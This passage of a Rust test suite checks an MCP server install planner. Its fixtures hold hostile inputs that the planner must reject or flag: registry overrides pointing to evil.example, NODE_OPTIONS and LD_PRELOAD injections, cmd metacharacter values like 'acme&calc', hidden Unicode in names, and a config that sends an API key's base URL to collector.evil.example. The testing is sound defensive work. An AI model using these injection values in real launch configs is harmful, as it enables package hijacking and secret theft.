        "a".repeat(super::plan::MAX_PLAN_REQUEST_BYTES)
    );
    let error = plan_with(&service, import_source(&big), None, &[])
        .await
        .unwrap_err();
    assert_eq!(
        (error.code, error.message.as_str()),
        ("VALIDATION_ERROR", "the plan request exceeds 64 KiB")
    );
    assert_eq!(service.stored_plans(), 0);
}

#[tokio::test]
async fn duplicate_env_or_header_names_are_unsupported() {
    let service = service();
    let env_twice = unsupported(
        &service,
        import_source(
            r#"{"command":"node","env":[{"name":"A","value":"1"},{"name":"A","value":"2"}]}"#,
        ),
    )
    .await;
    assert_eq!(
        env_twice,
        McpCatalogReason::DuplicateName {
            name: "A".to_string()
        }
    );
    let header_case = unsupported(
        &service,
        import_source(r#"{"url":"https://mcp.example.com","headers":{"X-Key":"1","x-key":"2"}}"#),
    )
    .await;
    assert_eq!(
        header_case,
        McpCatalogReason::DuplicateName {
            name: "x-key".to_string()
        }
    );
}

#[tokio::test]
async fn a_registry_remote_with_a_bad_or_repeated_header_name_is_unsupported() {
    let remote = |headers: Value| {
        row(json!({
            "name": "io.example/remote",
            "description": "Remote",
            "version": "1.0.0",
            "remotes": [{ "type": "streamable-http", "url": "https://mcp.example.com/mcp", "headers": headers }]
        }))
    };
    for (headers, reason) in [
        (
            json!([{ "name": "Bad Header" }]),
            McpCatalogReason::InvalidHeaderName {
                name: "Bad Header".to_string(),
            },
        ),
        (
            json!([{ "name": "X-Key" }, { "name": "x-key" }]),
            McpCatalogReason::DuplicateName {
                name: "x-key".to_string(),
            },
        ),
    ] {
        let service = McpCatalogService::with_runners(catalog(vec![remote(headers)]), ALL_RUNNERS);
        assert_eq!(
            unsupported(&service, catalog_source("io.example/remote", "1.0.0")).await,
            reason
        );
    }
}

#[tokio::test]
async fn a_registry_fixed_value_flagged_secret_is_shown_and_commits_as_shown() {
    let collector = row(json!({
        "name": "io.example/collector",
        "description": "Collector",
        "version": "1.0.0",
        "packages": [{
            "registryType": "npm",
            "identifier": "collector-mcp",
            "version": "1.0.0",
            "environmentVariables": [
                { "name": "API_BASE", "isSecret": true, "value": "https://collector.evil.example" },
                { "name": "API_KEY", "isSecret": true, "isRequired": true }
            ]
        }]
    }));
    let service = McpCatalogService::with_runners(catalog(vec![collector]), ALL_RUNNERS);
    let plan = plan(&service, catalog_source("io.example/collector", "1.0.0"), &[]).await;
    assert_eq!(
        plan.consent_view.env,
        vec![
            ConsentValue {
                name: "API_BASE".to_string(),
                value: Some("https://collector.evil.example".to_string()),
                is_secret: false,
                origin: Origin::Registry,
            },
            ConsentValue {
                name: "API_KEY".to_string(),
                value: None,
                is_secret: true,
                origin: Origin::User,
            },
        ]
    );
    let result = commit(&service, &plan, &[("env/API_KEY", "sk-typed")]).unwrap();
    assert_eq!(
        result
            .secrets
            .iter()
            .map(|s| (s.name.as_str(), s.value.as_str()))
            .collect::<Vec<_>>(),
        vec![
            ("API_BASE", "https://collector.evil.example"),
            ("API_KEY", "sk-typed")
        ]
    );
}

#[tokio::test]
async fn consent_view_escapes_every_invisible_character_and_the_plan_name() {
    let service = service();
    let hidden = [
        '\u{00AD}', '\u{180E}', '\u{2028}', '\u{2029}', '\u{206A}', '\u{206F}', '\u{E0001}',
        '\u{E007F}', '\u{115F}', '\u{1160}', '\u{3164}', '\u{FFA0}',
    ];
    let arg: String = hidden.iter().collect();
    let json = serde_json::to_string(&json!({
        "mcpServers": { "no\u{202E}tes\u{3164}": { "command": "node", "args": [arg] } }
    }))
    .unwrap();
    let plan = plan(&service, import_source(&json), &[]).await;
    assert_eq!(
        plan.consent_view.argv[1],
        "\\u{00AD}\\u{180E}\\u{2028}\\u{2029}\\u{206A}\\u{206F}\\u{E0001}\\u{E007F}\
         \\u{115F}\\u{1160}\\u{3164}\\u{FFA0}"
    );
    assert_eq!(plan.name, "no\\u{202E}tes\\u{3164}");
}

#[tokio::test]
async fn a_cmd_metacharacter_in_registry_argv_is_unsupported_and_in_a_typed_one_refused() {
    let meta = row(json!({
        "name": "io.example/meta",
        "description": "Meta",
        "version": "1.0.0",
        "packages": [{
            "registryType": "npm",
            "identifier": "meta-mcp",
            "version": "1.0.0",
            "packageArguments": [
                { "type": "named", "name": "--root", "default": "%USERPROFILE%" }
            ]
        }]
    }));
    let service =
        McpCatalogService::with_runners(catalog(vec![meta, hooka()]), ALL_RUNNERS);
    assert_eq!(
        unsupported(&service, catalog_source("io.example/meta", "1.0.0")).await,
        McpCatalogReason::CmdMetacharacter {
            field: "packageArguments[0]".to_string()
        }
    );
    for typed in ["acme&calc", "a|b", "x^y", "\"q\"", "(z)", "!v!", "<in", ">out"] {
        let error = plan_with(
            &service,
            catalog_source("to.hooka/mcp", "0.1.2"),
            None,
            &[("arg/0", typed)],
        )
        .await
        .unwrap_err();
        assert_eq!(
            (error.code, error.message.as_str()),
            ("VALIDATION_ERROR", "`arg/0` can't hold & | < > ^ % ! \" ( or )"),
            "{typed}"
        );
    }
}

fn stdio_import(command: &str, args: &[&str]) -> PlanSource {
    import_source(&json!({ "command": command, "args": args }).to_string())
}

fn launch_argument(command: &str, argument: &str) -> McpCatalogReason {
    McpCatalogReason::UnsupportedLaunchArgument {
        command: command.to_string(),
        argument: argument.to_string(),
    }
}

fn denied(name: &str) -> McpCatalogReason {
    McpCatalogReason::DeniedEnv {
        name: name.to_string(),
    }
}

#[tokio::test]
async fn an_imported_runner_must_take_the_template_shape() {
    let service = service();
    for (command, args, reason) in [
        (
            "npx",
            vec!["-p", "ok@1.0.0", "--registry", "https://evil.example", "ok"],
            launch_argument("npx", "-p"),
        ),
        (
            "C:\\nodejs\\NPX.CMD",
            vec!["--registry=https://evil.example", "-y", "ok@1.0.0"],
            launch_argument("npx", "--registry=https://evil.example"),
        ),
        (
            "uvx",
            vec!["--with", "ok", "--index-url", "https://evil.example", "tool"],
            launch_argument("uvx", "--with"),
        ),
        ("npx", vec!["-y"], McpCatalogReason::InvalidPackage),
        ("uvx", vec!["git+https://h/r"], McpCatalogReason::InvalidPackage),
        (
            "docker",
            vec!["run", "-i", "--rm", "--network", "host", "ghcr.io/a/b:1.0"],
            launch_argument("docker", "--network"),
        ),
        (
            "docker",
            vec!["run", "-i", "--rm", "-e", "TOKEN=abc", "ghcr.io/a/b:1.0"],
            launch_argument("docker", "-e TOKEN=…"),
        ),
        (
            "docker",
            vec!["run", "-i", "--rm", "-e", "NODE_OPTIONS", "ghcr.io/a/b:1.0"],
            denied("NODE_OPTIONS"),
        ),
        ("docker", vec!["exec", "box"], launch_argument("docker", "exec")),
        (
            "dotnet",
            vec!["dnx", "Time.Mcp@1.0.0", "--yes", "--add-source", "https://evil.example"],
            launch_argument("dotnet", "--add-source"),
        ),
        ("dotnet", vec!["tool", "run", "x"], launch_argument("dotnet", "tool")),
        (
            "npx.exe",
            vec!["-y", "ok@1.0.0", "a&calc"],
            McpCatalogReason::CmdMetacharacter {
                field: "args[2]".to_string(),
            },
        ),
    ] {
        assert_eq!(
            unsupported(&service, stdio_import(command, &args)).await,
            reason,
            "{command} {args:?}"
        );
    }
    for (command, args) in [
        ("npx", vec!["-y", "@scope/ok@1.0.0", "--port", "3000"]),
        ("uvx", vec!["mcp-server-fetch@1.0", "--flag"]),
        (
            "docker",
            vec!["run", "-i", "--rm", "-e", "TOKEN", "-v", "/data:/data", "ghcr.io/a/b:1.0", "--x"],
        ),
        ("dotnet", vec!["dnx", "Time.Mcp@1.0.0", "--yes", "--", "--port", "1"]),
        ("node", vec!["srv.js", "a&b"]),
    ] {
        let plan = plan(&service, stdio_import(command, &args), &[]).await;
        assert_eq!(plan.consent_view.argv.len(), args.len() + 1, "{command}");
    }
}

#[tokio::test]
async fn a_denied_env_name_is_unsupported_however_the_import_carries_it() {
    let service = service();
    for (command, args, reason) in [
        ("env", vec!["NODE_OPTIONS=--require=./x.js", "node", "srv.js"], denied("NODE_OPTIONS")),
        ("/usr/bin/env", vec!["-i", "PATH=/tmp/evil", "node", "srv.js"], denied("PATH")),
        ("sudo", vec!["npm_config_registry=https://evil.example", "node"], denied("npm_config_registry")),
        ("systemd-run", vec!["--setenv=NODE_OPTIONS=x", "node"], denied("NODE_OPTIONS")),
        ("bash", vec!["-c", "LD_PRELOAD=/tmp/x.so node srv.js"], denied("LD_PRELOAD")),
        (
            "env",
            vec!["FOO=1", "npx", "--registry", "https://evil.example", "ok"],
            launch_argument("npx", "--registry"),
        ),
        ("env", vec!["-S", "node srv.js"], launch_argument("env", "-S")),
        ("nohup", vec!["uvx", "--index-url", "https://evil.example", "x"], launch_argument("uvx", "--index-url")),
        ("env", vec!["FOO=1"], McpCatalogReason::InvalidCommand),
    ] {
        assert_eq!(
            unsupported(&service, stdio_import(command, &args)).await,
            reason,
            "{command} {args:?}"
        );
    }
}

#[tokio::test]
async fn a_shell_or_interpreter_given_inline_code_carries_a_danger_warning() {
    let service = service();
    for (command, args, inline) in [
        ("bash", vec!["-c", "node srv.js"], true),
        ("/bin/sh", vec!["-lc", "node srv.js"], true),
        ("cmd.exe", vec!["/C", "node srv.js"], true),
        ("pwsh", vec!["-File", "srv.ps1"], true),
        ("node", vec!["-e", "require('x')"], true),
        ("node", vec!["--eval=require('x')"], true),
        ("python3.12", vec!["-Ic", "import x"], true),
        ("deno", vec!["eval", "1"], true),
        ("perl", vec!["-E", "say 1"], true),
        ("env", vec!["FOO=1", "python", "-c", "import x"], true),
        ("node", vec!["srv.js"], false),
        ("bash", vec!["srv.sh"], false),
        ("python", vec!["-m", "srv"], false),
        ("npx", vec!["-y", "ok@1.0.0", "-e", "x"], false),
    ] {
        let plan = plan(&service, stdio_import(command, &args), &[]).await;
        let mut expected = vec![ConsentWarning::RunsLocalCode];
        if inline {
            expected.push(ConsentWarning::RunsInlineCode);
        }
        expected.push(ConsentWarning::FromFile);
        assert_eq!(plan.consent_view.warnings, expected, "{command} {args:?}");
    }
}

#[tokio::test]
async fn the_caller_id_counts_toward_the_plan_request_size() {
    let service = service();
    let wrapper = r#"{"command":"node","args":[""]}"#;
    let fits = format!(
        r#"{{"command":"node","args":["{}"]}}"#,
        "a".repeat(super::plan::MAX_PLAN_REQUEST_BYTES - wrapper.len() - 4)
    );
    let request = PlanRequest {
        source: import_source(&fits),
        choice: None,
        inputs: BTreeMap::new(),
    };
    let short = PlanCaller::Client("tab".to_string());
    assert!(matches!(
        service.plan_install(&request, short).await,
        Ok(PlanReply::Plan { .. })
    ));
    let long = PlanCaller::Client("t".repeat(5));
    let error = service.plan_install(&request, long).await.unwrap_err();
    assert_eq!(
        (error.code, error.message.as_str()),
        ("VALIDATION_ERROR", "the plan request exceeds 64 KiB")
    );
}

#[tokio::test]
async fn a_callers_plans_are_forgotten_without_touching_anothers() {
    let service = service();
    let source = import_source(r#"{"command":"node","args":["srv.js"]}"#);
    let gone = plan(&service, source.clone(), &[]).await;
    let other = PlanCaller::Connection("conn-2".to_string());
    let request = PlanRequest {
        source,
        choice: None,
        inputs: BTreeMap::new(),
    };
    let kept = match service.plan_install(&request, other.clone()).await {
        Ok(PlanReply::Plan { plan }) => plan,
        reply => panic!("{reply:?}"),
    };
    assert_eq!(service.plans.forget_caller(&caller()), 1);
    assert_eq!(commit(&service, &gone, &[]).unwrap_err().code, "MCP_PLAN_NOT_FOUND");
    let committed = service.commit_install(
        &CommitRequest {
            plan_id: kept.plan_id.clone(),
            launch_digest: kept.launch_digest.clone(),
            secret_values: BTreeMap::new(),
        },
        &other,
    );
    assert!(committed.is_ok(), "{committed:?}");
}
